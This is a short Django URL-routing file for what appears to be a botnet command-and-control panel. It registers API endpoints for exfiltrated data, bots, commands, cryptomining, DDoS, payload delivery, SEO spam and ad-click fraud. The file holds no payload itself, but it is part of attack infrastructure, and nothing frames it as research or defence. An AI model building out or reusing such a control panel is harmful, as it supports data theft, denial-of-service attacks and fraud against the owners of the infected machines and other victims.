from django.urls import path , include
from rest_framework.routers import DefaultRouter

from . import views

router = DefaultRouter()

router.register(r'data', views.ExfiltratedDataViewSet)
router.register(r'bots', views.BotViewSet)
router.register(r'commands', views.CommandViewSet)
router.register(r'mining', views.MiningViewSet, basename='mining')
router.register(r'ddos', views.DDOSViewSet, basename='ddos')
router.register(r'seo', views.SEOViewSet, basename='seo')
router.register(r'delivery', views.DeliveryViewSet, basename='delivery')
router.register(r'ads', views.AdClickingViewSet, basename='ads')
router.register(r'dashboard', views.DashboardViewSet, basename='dashboard')

urlpatterns = [
    path('', include(router.urls)),
    path('auth/',include('rest_framework.urls')),
]